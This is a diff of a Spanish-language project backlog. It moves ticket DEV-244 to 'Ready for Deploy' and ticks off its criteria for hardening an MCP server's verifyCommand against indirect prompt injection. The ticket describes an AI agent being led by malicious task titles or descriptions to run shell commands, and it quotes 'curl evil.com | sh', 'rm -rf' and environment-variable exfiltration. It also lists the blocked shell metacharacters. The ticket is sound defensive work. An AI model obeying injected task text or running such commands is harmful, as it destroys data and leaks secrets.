@@ -115,7 +115,7 @@ Permitir a los usuarios vincular tareas o hitos de entrega con sus calendarios p
 
 ---
 
-### 🚀 Ready for Deploy (9)
+### 🚀 Ready for Deploy (10)
 
 #### [DEV-234] Fase 0: Primitivo Modal accesible y Estabilidad Funcional P0
 - **Prioridad**: `high` | **Tipo**: `bug`
@@ -384,7 +384,31 @@ Implementación de mitigaciones de seguridad en el dev server y capa UI de gripm
 
 ---
 
-### 📋 Backlog / Draft (22)
+#### [DEV-244] Endurecimiento de verifyCommand en Gatekeeper MCP contra prompt injection (allowlist de scripts package.json y anti-subshell)
+- **Prioridad**: `high` | **Tipo**: `bug`
+
+Endurecimiento del Gatekeeper de ejecución de verificación en `scripts/mcp-server.ts`:
+
+Aunque la Fase 2 (DEV-242 / SEC-01) erradicó la lectura ciega de comandos desde el frontmatter YAML en disco, un agente de IA que sea inducido mediante prompt injection indirecto (por ejemplo, a través de instrucciones maliciosas en el título o descripción de una tarea externa) podría pasar un comando shell arbitrario destructivo en el argumento `verifyCommand` (`curl evil.com | sh`, `rm -rf`, exfiltración de variables de entorno).
+
+Para mitigar este vector:
+1. **Restricción a scripts de `package.json` o binarios autorizados:**
+   - `verifyCommand` solo puede invocar scripts existentes en el `package.json` del repositorio (`npm test`, `npm run <script>`, `npx <allowed-tool>`).
+2. **Rechazo estricto de metacaracteres shell:**
+   - Prohibir operadores de tubería, encadenamiento y redirección (`|`, `&`, `;`, `` ` ``, `$()`, `<`, `>`).
+3. **Validación previa sin ejecución:**
+   - Si el comando contiene caracteres prohibidos o no coincide con los scripts autorizados, el Gatekeeper rechaza la transición de inmediato con un error descriptivo sin invocar subshells.
+
+**Criterios de Aceptación:**
+- [x] #1 scripts/mcp-server.ts restringe verifyCommand exclusivamente a scripts definidos en package.json (npm test, npm run <script>) o comandos de allowlist segura
+- [x] #2 Rechazo estricto de metacaracteres de encadenamiento o subshell (| & ; ` $() < >) en verifyCommand
+- [x] #3 Invocaciones con comandos no autorizados devuelven error descriptivo del Gatekeeper antes de spawnear cualquier proceso
+- [x] #4 scripts/verify-mcp-binary.js incluye pruebas automatizadas de rechazo ante inyección de comandos en verifyCommand
+- [x] #5 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)
+
+---
+
+### 📋 Backlog / Draft (21)
 
 #### [DEV-039] Sincronización no invasiva de árbol Git con estados de backlog y releases
 - **Prioridad**: `low` | **Tipo**: `feature`
@@ -997,30 +1021,6 @@ Tras la consolidación como paquete autónomo `@gripm/board`, no existe justific
 - [ ] #5 Logs de consola y descripciones en runtime estandarizados 100% en gripm
 - [ ] #6 Suites de prueba actualizadas al nuevo estándar sin romper ningún paso de la suite
 - [ ] #7 Pirámide de verificación en verde (tsc --noEmit, npm test con 16 pasos, backlog:sync, backlog:check)
-
----
-
-#### [DEV-244] Endurecimiento de verifyCommand en Gatekeeper MCP contra prompt injection (allowlist de scripts package.json y anti-subshell)
-- **Prioridad**: `high` | **Tipo**: `bug`
-
-Endurecimiento del Gatekeeper de ejecución de verificación en `scripts/mcp-server.ts`:
-
-Aunque la Fase 2 (DEV-242 / SEC-01) erradicó la lectura ciega de comandos desde el frontmatter YAML en disco, un agente de IA que sea inducido mediante prompt injection indirecto (por ejemplo, a través de instrucciones maliciosas en el título o descripción de una tarea externa) podría pasar un comando shell arbitrario destructivo en el argumento `verifyCommand` (`curl evil.com | sh`, `rm -rf`, exfiltración de variables de entorno).
-
-Para mitigar este vector:
-1. **Restricción a scripts de `package.json` o binarios autorizados:**
-   - `verifyCommand` solo puede invocar scripts existentes en el `package.json` del repositorio (`npm test`, `npm run <script>`, `npx <allowed-tool>`).
-2. **Rechazo estricto de metacaracteres shell:**
-   - Prohibir operadores de tubería, encadenamiento y redirección (`|`, `&`, `;`, `` ` ``, `$()`, `<`, `>`).
-3. **Validación previa sin ejecución:**
-   - Si el comando contiene caracteres prohibidos o no coincide con los scripts autorizados, el Gatekeeper rechaza la transición de inmediato con un error descriptivo sin invocar subshells.
-
-**Criterios de Aceptación:**
-- [ ] #1 scripts/mcp-server.ts restringe verifyCommand exclusivamente a scripts definidos en package.json (npm test, npm run <script>) o comandos de allowlist segura
-- [ ] #2 Rechazo estricto de metacaracteres de encadenamiento o subshell (| & ; ` $() < >) en verifyCommand
-- [ ] #3 Invocaciones con comandos no autorizados devuelven error descriptivo del Gatekeeper antes de spawnear cualquier proceso
-- [ ] #4 scripts/verify-mcp-binary.js incluye pruebas automatizadas de rechazo ante inyección de comandos en verifyCommand
-- [ ] #5 Pirámide de verificación en verde (tsc, npm test, backlog:sync, backlog:check, publish:check, build)
 
 ---
 
